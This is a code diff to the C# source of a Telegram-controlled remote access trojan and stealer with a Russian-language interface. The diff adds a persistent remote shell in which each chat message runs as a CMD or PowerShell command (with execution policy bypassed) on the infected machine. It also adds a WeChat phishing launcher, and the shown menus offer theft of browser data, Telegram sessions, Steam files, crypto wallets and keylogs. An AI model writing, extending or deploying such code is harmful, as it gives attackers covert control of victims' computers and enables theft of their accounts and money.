@@ -222,20 +222,26 @@ namespace FinalBot
                     await ShowAdminPanel(message.Chat.Id);
                     return;
                 }
-                else if (state == "awaiting_shell_cmd")
+                else if (state == "shell_cmd_mode")
                 {
-                    _userState.Remove(message.Chat.Id);
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"⚙️ <i>Executing CMD:</i> <code>{text}</code>"), parseMode: ParseMode.Html);
+                    // Persistent shell mode - don't remove state
+                    await _botClient.SendChatActionAsync(message.Chat.Id, ChatAction.Typing);
                     string res = await ShellManager.ExecuteCommand(text);
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"🏁 <b>CMD Result:</b>\n<code>{WebUtility.HtmlEncode(res)}</code>"), parseMode: ParseMode.Html);
+                    
+                    var exitMarkup = new InlineKeyboardMarkup(new[] { InlineKeyboardButton.WithCallbackData("🔴 ВЫЙТИ ИЗ РЕЖИМА CMD", "shell_mode_exit") });
+                    string output = $"💻 <b>CMD EXECUTION:</b> <code>{WebUtility.HtmlEncode(text)}</code>\n\n{res}";
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(output), parseMode: ParseMode.Html, replyMarkup: exitMarkup);
                     return;
                 }
-                else if (state == "awaiting_shell_ps")
+                else if (state == "shell_ps_mode")
                 {
-                    _userState.Remove(message.Chat.Id);
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"⚙️ <i>Executing PowerShell:</i> <code>{text}</code>"), parseMode: ParseMode.Html);
-                    string res = await ShellManager.ExecuteCommand($"powershell -ExecutionPolicy Bypass -Command \"{text}\"");
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"🏁 <b>PS Result:</b>\n<code>{WebUtility.HtmlEncode(res)}</code>"), parseMode: ParseMode.Html);
+                    // Persistent shell mode - don't remove state
+                    await _botClient.SendChatActionAsync(message.Chat.Id, ChatAction.Typing);
+                    string res = await ShellManager.ExecuteCommand($"powershell -NoProfile -ExecutionPolicy Bypass -Command \"{text}\"");
+                    
+                    var exitMarkup = new InlineKeyboardMarkup(new[] { InlineKeyboardButton.WithCallbackData("🔴 ВЫЙТИ ИЗ РЕЖИМА PS", "shell_mode_exit") });
+                    string output = $"🖥 <b>PS EXECUTION:</b> <code>{WebUtility.HtmlEncode(text)}</code>\n\n{res}";
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(output), parseMode: ParseMode.Html, replyMarkup: exitMarkup);
                     return;
                 }
                 else if (state == "awaiting_discord_token")
@@ -425,12 +431,21 @@ namespace FinalBot
                         else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ История пуста.");
                         break;
                     case "shell_cmd":
-                        _userState[message.Chat.Id] = "awaiting_shell_cmd";
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Введите CMD команду:</b>", parseMode: ParseMode.Html);
+                        _userState[message.Chat.Id] = "shell_cmd_mode";
+                        var cmdExit = new InlineKeyboardMarkup(new[] { InlineKeyboardButton.WithCallbackData("🔴 ВЫЙТИ ИЗ РЕЖИМА", "shell_mode_exit") });
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "💻 Режим CMD включен");
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("💻 <b>РЕЖИМ CMD АКТИВИРОВАН</b>\n━━━━━━━━━━━━━━━━━━\nВы можете писать команды прямо в чат. Бот будет исполнять их до нажатия кнопки выхода."), parseMode: ParseMode.Html, replyMarkup: cmdExit);
                         break;
                     case "shell_ps":
-                        _userState[message.Chat.Id] = "awaiting_shell_ps";
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Введите PowerShell команду:</b>", parseMode: ParseMode.Html);
+                        _userState[message.Chat.Id] = "shell_ps_mode";
+                        var psExit = new InlineKeyboardMarkup(new[] { InlineKeyboardButton.WithCallbackData("🔴 ВЫЙТИ ИЗ РЕЖИМА", "shell_mode_exit") });
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🖥 Режим PowerShell включен");
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("🖥 <b>РЕЖИМ POWERSHELL АКТИВИРОВАН</b>\n━━━━━━━━━━━━━━━━━━\nВсе текстовые сообщения будут исполнены как PS-скрипты."), parseMode: ParseMode.Html, replyMarkup: psExit);
+                        break;
+                    case "shell_mode_exit":
+                        _userState.Remove(message.Chat.Id);
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚪 Режим терминала завершен");
+                        await ShowSystemPanel(message.Chat.Id, message.MessageId);
                         break;
                     case "keylog_get":
                         await HandleKeylogGet(message.Chat.Id);
@@ -554,6 +569,17 @@ namespace FinalBot
                         break;
                     case "work_telegram":
                         await HandleTelegramSteal(message.Chat.Id);
+                        break;
+                    case "work_wechat_phish":
+                        if (PhishManager.IsWeChatInstalled())
+                        {
+                            PhishManager.LaunchWeChatPhish();
+                            await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("🚀 <b>SUCCESS:</b> WeChat Phish launched."), parseMode: ParseMode.Html);
+                        }
+                        else
+                        {
+                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "❌ WeChat не найден в системе", showAlert: true);
+                        }
                         break;
                     case "work_browsers":
                         await HandleBrowserSteal(message.Chat.Id);
@@ -970,7 +996,10 @@ namespace FinalBot
             var markup = new InlineKeyboardMarkup(new[]
             {
                 new[] { InlineKeyboardButton.WithCallbackData("📂 ФАЙЛ-МЕНЕДЖЕР", "file_manager") },
-                new[] { InlineKeyboardButton.WithCallbackData("🐚 CMD", "shell_cmd"), InlineKeyboardButton.WithCallbackData("📜 POWERSHELL", "shell_ps") },
+                new[] { 
+                    InlineKeyboardButton.WithCallbackData(_userState.TryGetValue(chatId, out string s) && s == "shell_cmd_mode" ? "🐚 CMD 🟢" : "🐚 CMD 🔴", "shell_cmd"), 
+                    InlineKeyboardButton.WithCallbackData(_userState.TryGetValue(chatId, out string s2) && s2 == "shell_ps_mode" ? "📜 PS 🟢" : "📜 PS 🔴", "shell_ps") 
+                },
                 new[]
                 {
                     InlineKeyboardButton.WithCallbackData("⚙️ ИНФО", "system_info"),
@@ -1005,8 +1034,9 @@ namespace FinalBot
                 new[]
                 {
                     InlineKeyboardButton.WithCallbackData("🌍 БРАУЗЕРЫ", "work_browsers"),
-                    InlineKeyboardButton.WithCallbackData("💎 STEAM SSFN", "work_steam_ssfn")
+                    InlineKeyboardButton.WithCallbackData("🚀 WECHAT ФИШИНГ", "work_wechat_phish")
                 },
+                new[] { InlineKeyboardButton.WithCallbackData("💎 STEAM SSFN", "work_steam_ssfn") },
                 new[] { InlineKeyboardButton.WithCallbackData("💰 КРИПТО", "work_crypto") },
                 new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
             });
